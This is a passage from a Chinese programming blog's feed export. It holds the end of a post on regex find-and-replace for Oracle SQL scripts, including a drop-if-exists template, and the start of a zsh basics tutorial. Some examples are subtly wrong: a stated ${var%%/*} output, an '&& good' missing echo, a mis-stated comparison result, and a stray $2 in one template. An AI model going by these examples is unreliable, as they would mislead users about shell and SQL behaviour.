keyword">type</span><span class="token punctuation">,</span>  DATA_DATE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>DATA_DATE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  DATA_REF AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>DATA_REF<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  DATA_SOURCE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>DATA_SOURCE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  PI_INDICATOR AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>PI_INDICATOR<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  PRODUCT_TYPE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>PRODUCT_TYPE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  REFERENCE_NUMBER AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>REFERENCE_NUMBER<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  CI_NUMBER AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>CI_NUMBER<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  CI_GL_DESC AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>CI_GL_DESC<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  ISSUER_TYPE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>ISSUER_TYPE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  ISSUER_COUNTRY AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>ISSUER_COUNTRY<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  FITCH_RATING AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>FITCH_RATING<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  MOODY_RATING AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>MOODY_RATING<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  SP_RATING AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>SP_RATING<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  TRADE_DATE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>TRADE_DATE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  VALUE_DATE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>VALUE_DATE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  MAT_DATE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>MAT_DATE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  MAT_TENOR AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>MAT_TENOR<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  CACLULATION_RATIO AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>CACLULATION_RATIO<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  CCY AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>CCY<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  CUR_AMOUNT AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>CUR_AMOUNT<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  CUR_AMOUNT_LCE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>CUR_AMOUNT_LCE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  LAST_AMOUNT AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>LAST_AMOUNT<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  LAST_AMOUNT_LCE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>LAST_AMOUNT_LCE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  VARI_AMOUNT AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>VARI_AMOUNT<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  VARI_AMOUNT_LCE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>VARI_AMOUNT_LCE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  VARI_LCE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>VARI_LCE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要做如下操作即可：</p><ul><li>查找：<code>  ([A-Z_]+) +((VARCHAR2)|(NUMBER))\([0-9,]{1,4}\)</code></li><li>替换为：<code>  $1 AIMP440020_CFR_M_BREK.$1@HKBRIISP_COSP_ADP_HKBRIISP%type</code></li></ul><p>就像魔法一样啊有木有！</p><blockquote><p>其中 <code>$1</code> 代表第一个匹配表达式，也就是 <code>([A-Z_]+)</code><br>其他编辑器应该类似，顶多 <code>$1</code> 有点区别</p></blockquote><p>再来一个：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/***************** PART 0 *****************/</span><span class="token comment">/***************** PART 1 *****************/</span><span class="token comment">/***************** PART 2 *****************/</span><span class="token comment">/***************** PART 3 *****************/</span><span class="token comment">/***************** PART 4 *****************/</span><span class="token comment">/***************** PART 5 *****************/</span><span class="token comment">/***************** PART 6 *****************/</span><span class="token comment">/***************** PART 7 *****************/</span><span class="token comment">/***************** PART 8 *****************/</span><span class="token comment">/***************** PART 9 *****************/</span><span class="token comment">/***************** PART 10 *****************/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>替换成</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/***************** PART 0 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 1 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 2 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 3 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 4 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 5 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 6 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 7 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 8 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 9 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/***************** PART 10 *****************/</span>SET_STEP_NO<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要做如下查找替换：</p><ol><li>查找：<code> PART (\d+)( .{10}\*+/)\n</code></li><li>替换为：<code> PART $1$2\nSET_STEP_NO($1);\n</code></li></ol><p>哈哈哈哈 太好玩了！</p><h3 id="ORACLE-中将所有创建表语句前面加上判断是否存在，存在则先进行删除的操作"><a href="#ORACLE-中将所有创建表语句前面加上判断是否存在，存在则先进行删除的操作" class="headerlink" title="ORACLE 中将所有创建表语句前面加上判断是否存在，存在则先进行删除的操作"></a>ORACLE 中将所有创建表语句前面加上判断是否存在，存在则先进行删除的操作</h3><p>再来个比较实用的：</p><p>Oracle 中判断数据库表是否存在的方式与 MySql 不太一样，复杂很多，那么给创建表的脚本上都加上判断存在的操作就可以用这个操作啦！</p><ul><li><p>有用户的</p><p>查找</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span>_<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>\<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span>_<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>\n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>替换</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">\n<span class="token comment">/********** drop table $1.$2 **********/</span>\ndeclare\n  i <span class="token keyword">integer</span><span class="token punctuation">;</span>\nbegin\n  <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>\n    <span class="token keyword">into</span> i\n    <span class="token keyword">from</span> all_tables s\n   <span class="token keyword">where</span> s<span class="token punctuation">.</span>owner <span class="token operator">=</span> <span class="token string">'$1'</span>\n     <span class="token operator">AND</span> s<span class="token punctuation">.</span>table_name <span class="token operator">=</span> <span class="token string">'$2'</span><span class="token punctuation">;</span>\n  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">then</span>\n    <span class="token keyword">execute</span> immediate <span class="token string">'drop table $1.$2'</span><span class="token punctuation">;</span>\n  <span class="token keyword">end</span> <span class="token keyword">if</span><span class="token punctuation">;</span>\nend<span class="token punctuation">;</span>\n<span class="token operator">/</span>\n<span class="token comment">/********** create table $1.$2 **********/</span>\nCREATE <span class="token keyword">TABLE</span> $<span class="token number">1.</span>$<span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>没用户的</p><p>查找</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>A<span class="token operator">-</span>Z0<span class="token operator">-</span><span class="token number">9</span>_<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span>\n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>替换</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">\n<span class="token comment">/********** drop table $1 **********/</span>\ndeclare\n  i <span class="token keyword">integer</span><span class="token punctuation">;</span>\nbegin\n  <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>\n    <span class="token keyword">into</span> i\n    <span class="token keyword">from</span> all_tables s\n   <span class="token keyword">where</span> s<span class="token punctuation">.</span>table_name <span class="token operator">=</span> <span class="token string">'$1'</span><span class="token punctuation">;</span>\n  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">then</span>\n    <span class="token keyword">execute</span> immediate <span class="token string">'drop table $1'</span><span class="token punctuation">;</span>\n  <span class="token keyword">end</span> <span class="token keyword">if</span><span class="token punctuation">;</span>\nend<span class="token punctuation">;</span>\n<span class="token operator">/</span>\n<span class="token comment">/********** create table $2 **********/</span>\nCREATE <span class="token keyword">TABLE</span> $<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zsh 基础</title>
      <link href="/2017/11/26/zshbasis/"/>
      <url>/2017/11/26/zshbasis/</url>
      
        <content type="html"><![CDATA[<p>最近工作中需要用到 shell 脚本，正好学习 zsh 在我的学习清单里，反正早晚都要学，正好现在用到了，就边学边做了。</p><p>我将会在这篇博客中整理记录我目前使用到的 shell 脚本知识，应该都是基础知识，哈哈。</p><blockquote><p>Linux 自带的 shell 是 bash，我这学习的是 zsh（bash 能做的它都能做~），但是基础部分应该都是差不多的。<br>网上关于 zsh 的文章大部分都是介绍如何安装和配置 zsh，所以这里就不介绍 zsh 的安装、使用和配置了。<br>另外至于为什么使用 zsh 也不做过多解释，因为喜欢:)</p></blockquote><span id="more"></span><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>接触一门新的编程语言，运行完 Hello World 后，首先要了解的基本就是如何定义和使用变量了。有了变量后可以比较变量内容，进而可以解除条件、循环、分支等语句，继而了解函数的用法…</p><p>所以，先来介绍变量和语句。</p><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><p>zsh 的变量多数情况不需要提前声明或者指定类型，可以直接赋值和使用（哈希表例外）。</p><blockquote><p><strong>zsh 有 5 中变量：整数、浮点数（bash 不支持）、字符串、数组、哈希表（或者叫关联数组或字典）</strong>，另外还有一些其他语言少有的东西，比如 alias（主要是交互的时候使用，编程基本用不到）。</p></blockquote><h4 id="整数与浮点数"><a href="#整数与浮点数" class="headerlink" title="整数与浮点数"></a>整数与浮点数</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">num1</span><span class="token operator">=</span><span class="token number">123</span><span class="token assign-left variable">num2</span><span class="token operator">=</span><span class="token number">123.456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>等号两端不能有空格</p></blockquote><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">str1</span><span class="token operator">=</span>abcde<span class="token assign-left variable">str2</span><span class="token operator">=</span><span class="token string">'abc def'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果字符串中包含空格等特殊字符，需要加引号</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">str3</span><span class="token operator">=</span><span class="token string">"abc def <span class="token variable">$num1</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>也可以用双引号，但和单引号有区别，比如<strong>双引号里可以使用变量</strong><br>使用 <code>$变量</code> 来使用之前定义的 <code>变量</code></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">str4</span><span class="token operator">=</span><span class="token string">"abc<span class="token entity" title="\t">\t</span>def<span class="token entity" title="\n">\n</span>g"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>在字符串中可以使用转义字符，单双引号均可</p></blockquote><h4 id="输入参数"><a href="#输入参数" class="headerlink" title="输入参数"></a>输入参数</h4><p>输入参数是用户在使用 shell 脚本的时候输入的变量，例如 <code>test.sh</code> 中的代码如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">in1</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token assign-left variable">in2</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token assign-left variable">in3</span><span class="token operator">=</span><span class="token variable">$3</span><span class="token builtin class-name">echo</span> <span class="token string">"用户输入的内容是：<span class="token variable">$1</span> <span class="token variable">$2</span> <span class="token variable">$3</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 test.sh 脚本时在终端中输入下面这行代码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sh</span> test.sh 欢迎阅读 CrazyBunQnQ 的博客<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该代码将会输出</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">echo "用户输入的内容是：欢迎阅读 CrazyBunQnQ 的博客"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>sh</code> 是调用 shell 脚本的命令</li><li><code>test.sh</code> 是需要执行的 shell 脚本文件名，shell 文件类似 Windows 中的 <code>.bat</code> 批处理文件</li><li>再之后的 <code>test.sh</code> 对应的参数，每个参数之间用空格隔开</li></ul><br>### 变量操作<h4 id="输出变量"><a href="#输出变量" class="headerlink" title="输出变量"></a>输出变量</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable">$str1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>也可以使用 print，上面这行会输出变量 str1 的值 <code>abcde</code><br>打桩法调试的时候很常用</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable">$str3</span> <span class="token operator">&gt;</span> log.log<span class="token builtin class-name">echo</span> <span class="token variable">$str4</span> <span class="token operator">&gt;&gt;</span> log.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><code>echo A &gt; B</code> 会将 A 的内容写入 B 文件中<br><code>echo A &gt;&gt; B</code> 也会将 A 的内容写入到 B 文件中<br><br>需要注意的是 <code>&gt;&gt;</code> 与 <code>&gt;</code> 不同：<br><code>&gt;</code> 是重新写入文件<br><code>&gt;&gt;</code> 是在文件中追加内容</p><p>如果 B 不存在，则会创建 B 文件<br>常用于输出日志</p></blockquote><h4 id="简单的数值计算"><a href="#简单的数值计算" class="headerlink" title="简单的数值计算"></a>简单的数值计算</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">num3</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$num1 <span class="token operator">+</span> $num2<span class="token variable">))</span></span><span class="token assign-left variable">num3</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>num1 <span class="token operator">+</span> num2<span class="token variable">))</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><code>((</code> 中的变量可以不使用 <code>$</code></p></blockquote><h4 id="截取字符串的几种方法"><a href="#截取字符串的几种方法" class="headerlink" title="截取字符串的几种方法"></a>截取字符串的几种方法</h4><p>定义字符串如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">str</span><span class="token operator">=</span>abcdef<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>zsh 数组截取</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$str</span>[2,4]"</span><span class="token comment"># 这里会输出「bcd」，2 和 4 都是字符在数组的位置，从 1 开始数，逗号两边不能有空格</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$str</span>[4,-1]"</span><span class="token comment"># 这里输出「def」，-1 是最后一个字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>bash 数组截取</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">${str<span class="token operator">:</span>0<span class="token operator">:</span>3}</span>"</span><span class="token comment"># 这里输出「abc」，从左边第 1 个字符开始，截取 3 个字符</span><span class="token comment"># 注意这里左边第一个字符从 0 开始，上面是从 1 开始</span>echo <span class="token string">"<span class="token variable">${str<span class="token operator">:</span>3}</span>"</span><span class="token comment"># 这里输出「def」，从左边第 4 个字符开始，一直到结束，也是从 0 开始计数</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">${str<span class="token operator">:</span>0-4<span class="token operator">:</span>3}</span>"</span><span class="token comment"># 这里输出「cde」，从右数第 4 个字符开始，截取 3 个字符，不能使用「-4」，必须要有 0</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">${str<span class="token operator">:</span>0-3}</span>"</span><span class="token comment"># 这里输出「def」，从右数第 3 个字符开始，截取到结束</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p># 号截取 —— 删除左边字符，保留右边字符 （可用于 bash)</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">var</span><span class="token operator">=</span>http://crazybunqnq.com/react-tetris<span class="token builtin class-name">echo</span> <span class="token variable">${var<span class="token operator">#</span>*<span class="token operator">/</span><span class="token operator">/</span>}</span><span class="token comment"># 这里输出「crazybunqnq.com/react-tetris」</span><span class="token comment"># 其中「var」是变量名，「#」号是运算符，「*//」表示从左边开始删除第一个「//」字符串及左边的所有字符</span><span class="token builtin class-name">echo</span> <span class="token variable">${var<span class="token operator">##</span>*<span class="token operator">/</span>}</span><span class="token comment"># 这里输出「react-tetris」</span><span class="token comment"># 其中「##」是运算符，「/*」表示从右边开始删除第一个（即左数最后一个）「/」字符串及左边的所有字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>% 号截取 —— 删除右边字符，保留左边字符（可用于 bash）</p><p> 与 # 号截取类似</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">var</span><span class="token operator">=</span>http://crazybunqnq.com/react-tetris<span class="token builtin class-name">echo</span> <span class="token variable">${var<span class="token operator">%</span><span class="token operator">/</span>r*}</span><span class="token comment"># 这里输出「http://crazybunqnq.com」</span><span class="token comment"># 其中「%」是运算符，「/r*」表示从左边开始删除第一个「/r」字符串及右边的所有字符</span><span class="token builtin class-name">echo</span> <span class="token variable">${var<span class="token operator">%%</span><span class="token operator">/</span>*}</span><span class="token comment"># 这里输出「http://crazybunqnq.com」</span><span class="token comment"># 其中「%%」是运算符，「/*」表示从右边开始删除第一个 (即左数最后一个)「/」字符串及游遍所有字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p># 表示注释，我好像在说废话…一看颜色就知道了，哈哈哈哈哈</p></blockquote><br>### 变量比较<h4 id="比较数值"><a href="#比较数值" class="headerlink" title="比较数值"></a>比较数值</h4><ol><li><p><code>(( ))</code> 用于数值比较等操作，如果为真返回 0，否则返回 1</p></li><li><p><code>&amp;&amp;</code> 后边的语句在前面的语句为真时才会执行</p></li><li><p>必须使用双等号 <code>==</code> 来比较</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">123</span><span class="token variable"><span class="token punctuation">((</span>num <span class="token operator">==</span> <span class="token number">123</span><span class="token punctuation">))</span></span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> good<span class="token comment"># 这里会输出「good」</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>((</code> 里面可以使用与 <code>&amp;&amp;</code> 或 <code>||</code> 非 <code>!</code> 操作符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token punctuation">((</span>num <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> num <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">))</span></span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> good<span class="token comment"># 这里会输出「good」</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="比较字符串"><a href="#比较字符串" class="headerlink" title="比较字符串"></a>比较字符串</h4><ol><li><p>比较字符串要用 <code>[[ ]]</code> ，<strong>内侧要有空格</strong></p></li><li><p>这里的双等号 <code>==</code> 可以替换成单等号 <code>=</code></p></li><li><p>$str 两侧不需要加双引号，即使 str 未定义或者 $str 中含有空格和特殊符号</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">str</span><span class="token operator">=</span>abc<span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$str</span> <span class="token operator">==</span> abc <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> good<span class="token comment"># 这里会输出「good」</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>可以和空字符串 <code>""</code> 比较，未定义的字符串和空字符串比较结果为真</p></li><li><p><code>[[</code> 里也可以使用 <code>&amp;&amp;</code> 、 <code>||</code> 和 <code>!</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$str</span> <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> <span class="token variable">$str</span> <span class="token operator">==</span> <span class="token number">123</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> good<span class="token comment"># 这里会输出「good」</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><br><h2 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h2><p>简单的变量使用介绍完了，来说说语句部分。</p><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><h4 id="用于比较字符串、判断文件等"><a href="#用于比较字符串、判断文件等" class="headerlink" title="[[ ]] 用于比较字符串、判断文件等"></a><code>[[ ]]</code> 用于比较字符串、判断文件等</h4><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">elif</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意 <code>elif</code> 不可写作 <code>else if</code><br>尽量不要使用 <code>[[ ]]</code> 比较数值，因为不留神的话，数值会被转化成字符串来比较，没有任何错误提示</p></blockquote><p>例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token operator">==</span> <span class="token string">"name"</span> <span class="token operator">||</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token operator">==</span> <span class="token string">"value"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$str</span>"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="用于比较数值，里面可以调用各种数值相关的函数，变量前的-可省略。"><a href="#用于比较数值，里面可以调用各种数值相关的函数，变量前的-可省略。" class="headerlink" title="(( )) 用于比较数值，里面可以调用各种数值相关的函数，变量前的 $ 可省略。"></a><code>(( ))</code> 